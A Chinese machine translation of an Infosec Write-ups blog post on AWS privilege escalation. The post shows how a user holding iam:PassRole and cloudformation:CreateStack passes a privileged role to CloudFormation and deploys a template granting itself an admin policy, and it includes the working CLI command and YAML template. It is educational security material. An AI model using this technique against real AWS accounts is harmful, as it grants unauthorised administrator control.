<html>
<head>
<title>Passing a Role to AWS CloudFormation to Escalate Privileges</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">将角色传递给AWS CloudFormation以提升权限</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/passing-a-role-to-cloudformation-to-escalate-privileges-602010d26f55?source=collection_archive---------0-----------------------#2022-09-04">https://infosecwriteups.com/passing-a-role-to-cloudformation-to-escalate-privileges-602010d26f55?source=collection_archive---------0-----------------------#2022-09-04</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/6f9d10276bce994d1230bd28e2a958a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1376/format:webp/1*EuSAgFhhxmeF7911x0NHZg.png"/></div></figure><p id="49ec" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">最小特权原则是只授予完成任务所需的权限。但是如何在AWS云中实现最小特权和安全构建呢？您可能只是利用附加到IAM用户或IAM角色的AdministratorAccess策略来删除过多的特权，而不会注意到具有额外特权的角色或资源通过iam:PassRole等其他方式隐式授予。</p><p id="b4ae" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在这篇博客文章中，CloudFormation用例将描述IAM用户如何使用iam:PassRole获得不受约束的权限提升。</p><h1 id="1983" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">必备知识</h1><p id="e24b" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated"><strong class="jw ir">自动气象站云形成</strong></p><p id="5d9b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">AWS CloudFormation是一项以有序方式提供AWS资源集合的服务，这些AWS资源包括IAM用户/角色的内嵌策略。</p><p id="ec4e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">AWS CloudFormation使用模板和堆栈。模板描述了AWS资源及其属性。每当创建AWS CloudFormation堆栈时，只要指定一个模板，就会提供模板中描述的资源。</p><p id="9fab" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">模板中所有AWS CloudFormation支持的AWS资源和属性类型都可以在<a class="ae lv" href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-template-resource-type-ref.html%20" rel="noopener ugc nofollow" target="_blank">这里</a>找到。</p><p id="e542" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在利用部分，通过AWS CloudFormation提升IAM用户的权限，将使用以下语法创建内联策略并将其附加到IAM用户:</p><pre class="lw lx ly lz gt ma mb mc md aw me bi"><span id="ed57" class="mf kt iq mb b gy mg mh l mi mj">Type: AWS::IAM::Policy<br/>Properties: <br/>  Groups: <br/>    - String<br/>  PolicyDocument: Json<br/>  PolicyName: String<br/>  Roles: <br/>    - String<br/>  Users: <br/>    - String</span></pre><p id="bfde" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> IAM:PassRole </strong></p><p id="81a5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">有时，当您使用AWS服务执行某些操作时，您需要向这些服务传递一个角色，这样它们就可以隐式地(不执行sts:AssumeRole)承担该角色来完成操作。</p><p id="475a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">以AWS CloudFormation为例，当使用如下所示的AWS cli创建堆栈时，您向堆栈传递一个指定为arn _ of _ cloud formation _ service _ role的角色，后跟–- role-arn标志，否则操作可能会由于权限不足而失败。</p><pre class="lw lx ly lz gt ma mb mc md aw me bi"><span id="3a68" class="mf kt iq mb b gy mg mh l mi mj">aws cloudformation create-stack –-stack-name demo_stack –-template-body file://malicious-template.yaml –-role-arn arn_of_cloudformation_service_role</span></pre><p id="2fa4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">并非每个人都有权将角色传递给服务，只有拥有iam:PassRole权限的用户才能这样做。</p><h1 id="a561" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">攻击场景</h1><p id="aad3" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated">为简单起见，假设有一个攻击者拥有IAM用户awsSecLab，该用户只拥有下面策略中描述的有限权限。</p><pre class="lw lx ly lz gt ma mb mc md aw me bi"><span id="846d" class="mf kt iq mb b gy mg mh l mi mj">{<br/>    "Version": "2012-10-17",<br/>    "Statement": [<br/>        {<br/>            "Effect": "Allow",<br/>            "Action": [<br/>                "iam:PassRole",<br/>                "iam:Get*",<br/>                "iam:List*",<br/>                "cloudformation:CreateStack"<br/>            ],<br/>            "Resource": "*"<br/>        }<br/>    ]<br/>}</span></pre><p id="7393" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">由于IAM用户awsSecLab被授权创建CloudFormation堆栈，他决定试试运气，并搜索CloudFormation可以承担的角色，同时浏览IAM角色列表，他找到了cloudformation-demo角色，具有以下受信任的实体。</p><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/261d9d36a7d70e263b3794803ff0265f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1242/format:webp/1*6ocwH2wANzdOVlY3ljlhOA.png"/></div></figure><p id="3eed" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">cloudformation-demo角色包含一个内嵌策略调用cloudformation-demopolicy，该策略使cloudformation能够更新附加到IAM用户的策略。</p><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ml"><img src="../Images/955aa4b2c3085619daa4c04101e9c77b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ejIPFCNpx2nJsmDJJNmboA.png"/></div></div></figure><p id="caba" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，权限提升所需的所有东西(攻击者传递角色和创建CloudFormation堆栈的权限，cloudformation-demo角色可以由AWS CloudFormation承担，从而允许它为攻击者更新策略)都已准备就绪，IAM用户awsSecLab决定尝试一下。</p><h1 id="f2ec" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">剥削</h1><p id="99bf" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated">为了提升权限，IAM用户awsSecLab创建了下面的CloudFormation模板，旨在为自己添加一个内联策略，这样他将拥有admin权限。模板在本地保存为IAM_Policy_CF.yaml。</p><pre class="lw lx ly lz gt ma mb mc md aw me bi"><span id="9caa" class="mf kt iq mb b gy mg mh l mi mj">AWSTemplateFormatVersion: 2010-09-09<br/>Description: Basic IAM Role<br/>​<br/>Resources:<br/>    AutoTemplate:<br/>        Type: 'AWS::IAM::Policy'<br/>        Properties:<br/>          PolicyName: root<br/>          PolicyDocument:<br/>            Version: "2012-10-17"<br/>            Statement:<br/>              - Effect: Allow<br/>                Action: '*'<br/>                Resource: '*'<br/>          Users:<br/>            - awsSecLab</span></pre><p id="7671" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">要提供模板中描述的策略，AWS CloudFormation堆栈应该对iam用户awsSecLab使用iam:PutUserPolicy权限。由于iam用户AWS clab可以传递cloudformation-demo角色来授予iam:PutUserPolicy对AWS CloudFormation堆栈的权限，因此在他为传递的角色发出如下带有- role-arn标志的<code class="fe mq mr ms mb b">aws cloudformation create-stack</code> cli后，堆栈将创建名为root的内联策略，并将其附加到IAM用户AWS clab。</p><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mt"><img src="../Images/68cdf7c64925747de551d17bd9d7a7df.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XZeGjQg-nGRzbucIvsUAXw.png"/></div></div></figure><p id="1350" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">IAM用户awsSecLab在AWS IAM控制台中检查IAM用户设置，他可以看到附加的根策略，这意味着他获得了管理员权限。</p><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mu"><img src="../Images/c37712b49e21a6b88aedf0266d1d5ac1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sZD-0k8Mt-dMIQgJRn4cfA.png"/></div></div></figure><p id="ec49" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，您已经学习了如何通过向AWS CloudFormation传递角色来执行特权操作。如果你认为这篇博文有帮助，请点击拍手👏按钮下面几下，以示支持！</p></div><div class="ab cl mv mw hu mx" role="separator"><span class="my bw bk mz na nb"/><span class="my bw bk mz na nb"/><span class="my bw bk mz na"/></div><div class="ij ik il im in"><h2 id="0059" class="mf kt iq bd ku nc nd dn ky ne nf dp lc kf ng nh lg kj ni nj lk kn nk nl lo nm bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lv" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>，以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>